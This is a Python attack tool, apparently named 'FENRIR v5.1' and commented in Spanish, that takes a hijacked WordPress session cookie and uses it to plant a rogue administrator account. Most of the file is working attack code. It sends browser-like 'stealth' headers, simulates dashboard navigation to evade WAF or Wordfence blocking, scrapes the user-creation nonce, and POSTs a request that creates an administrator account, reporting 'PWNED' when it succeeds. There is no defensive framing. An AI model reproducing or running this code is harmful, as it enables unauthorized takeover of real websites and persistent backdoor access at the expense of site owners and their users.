import asyncio
import aiohttp
import sys
import re
import time
import logging
import functools
import random
from dataclasses import dataclass, field
from typing import Optional, Dict, Any, Callable
from enum import Enum, auto
from yarl import URL

# ==============================================================================
#  🛠️ CONFIGURACIÓN & UTILS (NO BROTLI VERSION)
# ==============================================================================

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"

# --- DECORATORS ---

def operation_guard(func: Callable[..., Any]) -> Callable[..., Any]:
    @functools.wraps(func)
    async def wrapper(*args, **kwargs):
        start_time = time.perf_counter()
        func_name = func.__name__.replace('_', ' ').upper()
        try:
            print(colorize(f"   ⚙️  Iniciando: {func_name}...", Colors.CYAN))
            result = await func(*args, **kwargs)
            elapsed = time.perf_counter() - start_time
            print(colorize(f"   ✅ {func_name} completado en {elapsed:.2f}s", Colors.GREEN))
            return result
        except Exception as e:
            print(colorize(f"   ❌ ERROR CRÍTICO en {func_name}: {str(e)}", Colors.RED))
            return None
    return wrapper

# --- DATA STRUCTURES ---

class TargetType(Enum):
    WORDPRESS = auto()
    PRESTASHOP = auto()

@dataclass
class UserPayload:
    username: str
    password: str
    email: str
    role: str = "administrator"

@dataclass
class TargetConfig:
    base_url: str
    type: TargetType
    user_agent: str
    timeout: int = 30
    cookies: Dict[str, str] = field(default_factory=dict)

# ==============================================================================
#  🦍 CORE ENGINE: FENRIR v5.1 (COMPATIBILITY MODE)
# ==============================================================================

class FenrirEngine:
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session: Optional[aiohttp.ClientSession] = None
        
    def _get_headers(self, referer: str = None) -> Dict[str, str]:
        """
        Genera cabeceras que imitan un navegador real.
        FIX: Eliminado 'br' (Brotli) de Accept-Encoding para evitar errores de decodificación.
        """
        h = {
            "User-Agent": self.config.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
            # SOLUCIÓN: Solo pedimos gzip o deflate, que Python soporta nativamente.
            "Accept-Encoding": "gzip, deflate", 
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        }
        if referer:
            h["Referer"] = referer
        return h

    async def __aenter__(self) -> "FenrirEngine":
        jar = aiohttp.CookieJar(unsafe=True)
        if self.config.cookies:
            url_obj = URL(self.config.base_url)
            jar.update_cookies(self.config.cookies, response_url=url_obj)

        self.session = aiohttp.ClientSession(
            base_url=self.config.base_url,
            connector=aiohttp.TCPConnector(ssl=False),
            cookie_jar=jar,
            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def verify_access(self, path: str) -> bool:
        """Verifica acceso usando headers stealth."""
        if not self.session: return False
        
        full_url = f"{self.config.base_url.rstrip('/')}/{path.lstrip('/')}"
        print(f"\n🕵️  Verificando acceso a: {colorize(full_url, Colors.BOLD)}")

        try:
            # Usamos headers base sin referer específico para el primer hit
            async with self.session.get(path, headers=self._get_headers(), allow_redirects=True) as resp:
                content = await resp.text()
                real_url = str(resp.url)
                
                is_success = False
                
                if self.config.type == TargetType.WORDPRESS:
                    # Check reforzado: Admin bar o body class de admin
                    if "wp-login.php" not in real_url and ("wp-admin" in real_url or "wp-admin-bar" in content or "logged-in" in content):
                        is_success = True
                
                elif self.config.type == TargetType.PRESTASHOP:
                    if "login" not in real_url.lower() and any(k in content for k in ["logout", "employee_box", "PrestaShop"]):
                        is_success = True

                if is_success:
                    print(f"   {colorize('🔥 ACCESO CONFIRMADO: Cookies válidas.', Colors.GREEN)}")
                    return True
                else:
                    print(f"   {colorize('❄️  ACCESO DENEGADO. Revisa las cookies.', Colors.RED)}")
                    return False
        except Exception as e:
            print(f"❌ Error de conexión: {e}")
            return False

    @operation_guard
    async def deploy_user(self, payload: UserPayload) -> bool:
        if self.config.type == TargetType.WORDPRESS:
            return await self._exploit_wordpress(payload)
        return False

    async def _exploit_wordpress(self, payload: UserPayload) -> bool:
        """
        Estrategia WP V5.1 (Human-Like + No Brotli):
        1. Visita Dashboard (generar Referer legítimo).
        2. Navega a User-New con Referer.
        3. Postea con Referer.
        """
        if not self.session: return False
        
        dashboard_path = "/wp-admin/"
        target_path = "/wp-admin/user-new.php"
        
        # PASO 1: WARM-UP (Visitar Dashboard para engañar al WAF y obtener Referer)
        print(colorize("   🧠 Simulando navegación humana (Dashboard -> Add User)...", Colors.CYAN))
        async with self.session.get(dashboard_path, headers=self._get_headers()) as resp:
            await resp.text() # Consumir respuesta
            dashboard_url = str(resp.url)
        
        # PASO 2: OBTENER FORMULARIO CON REFERER
        print(colorize("   🔍 Escaneando user-new.php...", Colors.YELLOW))
        
        # Headers con Referer del dashboard
        stealth_headers = self._get_headers(referer=dashboard_url)
        
        async with self.session.get(target_path, headers=stealth_headers) as resp:
            text = await resp.text()
            
            # Debug snapshot por si acaso
            with open("debug_view.html", "w", encoding="utf-8") as f: f.write(text)

            # Si nos da 404 pero estamos logueados (tu caso anterior), es un WAF bloqueando.
            if resp.status == 404:
                print(colorize("   🛡️ ALERTA: El servidor devolvió 404. Posible bloqueo de WAF/Wordfence.", Colors.RED))
                if "wp-admin-bar" in text:
                     print(colorize("      (Pero sigues logueado. El firewall bloqueó esta petición específica).", Colors.YELLOW))
            
            # Búsqueda de Nonce (Multi-Pattern)
            nonce = None
            patterns = [
                r'name="_wpnonce_create-user"\s+value="([^"]+)"',
                r'value="([^"]+)"\s+name="_wpnonce_create-user"',
                r'id="_wpnonce_create-user"\s+value="([^"]+)"',
                # A veces el nonce está en un objeto JS var wpApiSettings
                r'"nonce":"([a-z0-9]+)"' 
            ]

            for pattern in patterns:
                match = re.search(pattern, text)
                if match:
                    nonce = match.group(1)
                    break
            
            if nonce:
                print(f"   🔑 Nonce capturado: {colorize(nonce, Colors.MAGENTA)}")
            else:
                print(colorize("   ❌ FATAL: No se encontró el Nonce.", Colors.RED))
                return False

        # PASO 3: ATAQUE (POST)
        data = {
            "action": "createuser",
            "_wpnonce_create-user": nonce,
            "user_login": payload.username,
            "email": payload.email,
            "first_name": "System",
            "last_name": "Admin",
            "url": "",
            "pass1": payload.password,
            "pass2": payload.password,
            "role": payload.role,
            "createuser": "Add New User"
        }
        
        # Headers con Referer de user-new.php (como si hubiéramos pulsado el botón "Crear")
        post_headers = self._get_headers(referer=str(resp.url))
        
        print(colorize(f"   🚀 Ejecutando inyección: {payload.username}...", Colors.YELLOW))
        async with self.session.post(target_path, data=data, headers=post_headers) as resp:
            res_text = await resp.text()
            
            if "users.php" in str(resp.url) or "New user created" in res_text or "usuario creado" in res_text:
                return True
            
            if "error" in res_text.lower():
                err_match = re.search(r'<div id="message" class="error"><p>(.*?)</p></div>', res_text)
                err_msg = err_match.group(1) if err_match else "Error genérico en POST"
                print(colorize(f"   ⚠️  Fallo en creación: {err_msg}", Colors.RED))
                return False
                
            return True

# ==============================================================================
#  🎮 INTERFAZ
# ==============================================================================

def parse_raw_cookies(raw_cookie: str) -> Dict[str, str]:
    cookies = {}
    raw_cookie = raw_cookie.strip()
    if raw_cookie.lower().startswith("cookie:"):
        raw_cookie = raw_cookie[7:].strip()
    parts = raw_cookie.split(";")
    for part in parts:
        if "=" in part:
            key, value = part.strip().split("=", 1)
            cookies[key] = value
    return cookies

async def main():
    print(colorize("\n🦍 FENRIR v5.1 - STEALTH MODE (NO BROTLI) 🦍\n", Colors.RED))

    url_input = input(">> URL Base: ").strip()
    if not url_input.startswith("http"): url_input = f"http://{url_input}"
    if not url_input.endswith("/"): url_input += "/"
    
    print("\n[1] WordPress")
    choice = input(">> Opción: ").strip()
    target_type = TargetType.WORDPRESS

    print(f"\n{Colors.YELLOW}👉 COOKIE SESSION HIJACK{Colors.RESET}")
    print("   Pega la cookie completa:")
    raw_cookie = input("   >> ").strip()
    cookie_dict = parse_raw_cookies(raw_cookie)
    
    if not cookie_dict:
        print(colorize("❌ Cookies inválidas.", Colors.RED))
        return

    print(f"\n{Colors.MAGENTA}⚔️  MODO{Colors.RESET}")
    print("   [1] Recon")
    print("   [2] Exploit (Crear Admin)")
    mode = input("   >> ").strip()

    # User Agent de Firefox Linux
    ua = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"

    config = TargetConfig(base_url=url_input, type=target_type, user_agent=ua, cookies=cookie_dict)

    async with FenrirEngine(config) as engine:
        path = "/wp-admin/"
        has_access = await engine.verify_access(path)
        
        if has_access and mode == '2':
            print(f"\n{Colors.CYAN}👤 DATOS NUEVO ADMIN{Colors.RESET}")
            u_user = input("   User: ").strip()
            u_email = input("   Email: ").strip()
            u_pass = input("   Pass: ").strip()
            
            payload = UserPayload(username=u_user, email=u_email, password=u_pass)
            success = await engine.deploy_user(payload)
            
            if success:
                 print(f"\n{colorize('💀 PWNED: Usuario Creado.', Colors.GREEN)}")
                 print(f"   Login: {url_input}wp-admin/")
            else:
                 print(f"\n{colorize('🛡️ FAILED.', Colors.RED)}")

if __name__ == "__main__":
    if sys.platform == 'win32': asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass